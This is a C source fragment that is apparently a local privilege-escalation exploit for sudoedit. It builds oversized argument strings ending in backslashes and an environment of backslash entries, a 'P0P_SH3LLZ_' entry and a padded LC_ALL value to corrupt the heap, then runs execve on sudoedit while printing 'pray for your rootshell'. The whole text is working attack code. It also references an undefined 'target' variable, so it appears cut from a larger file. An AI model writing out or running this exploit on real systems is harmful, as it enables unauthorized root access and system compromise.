#define MAX_ENVP 512
#define SUDOEDIT_PATH "/usr/bin/sudoedit"
#define SMASH_LEN_A 56
#define SMASH_LEN_B 54
#define NULL_STOMP_LEN 63
#define LC_ALL_LEN 212

int main() {
    char *smash_a = calloc(SMASH_LEN_A + 2, 1);
    char *smash_b = calloc(SMASH_LEN_B + 2, 1);
    memset(smash_a , 'A', SMASH_LEN_A);
    memset(smash_b , 'B', SMASH_LEN_B);
    smash_a[SMASH_LEN_A] = '\\';
    smash_b[SMASH_LEN_B] = '\\';

    char *s_argv[]={
        "sudoedit", "-s", smash_a, "\\", smash_b, NULL
    };

    char *s_envp[MAX_ENVP];
    int envp_pos = 0;

    for(int i = 0; i < NULL_STOMP_LEN; i++) {
        s_envp[envp_pos++] = "\\";
    }
    s_envp[envp_pos++] = "X/P0P_SH3LLZ_";

    char *lc_all = calloc(LC_ALL_LEN + 16, 1);
    strcpy(lc_all, "LC_ALL=C.UTF-8@");
    memset(lc_all+15, 'C', LC_ALL_LEN);

    s_envp[envp_pos++] = lc_all;
    s_envp[envp_pos++] = NULL;

    printf("** pray for your rootshell.. **\n");

    execve(target->sudoedit_path, s_argv, s_envp);

    return 0;
}
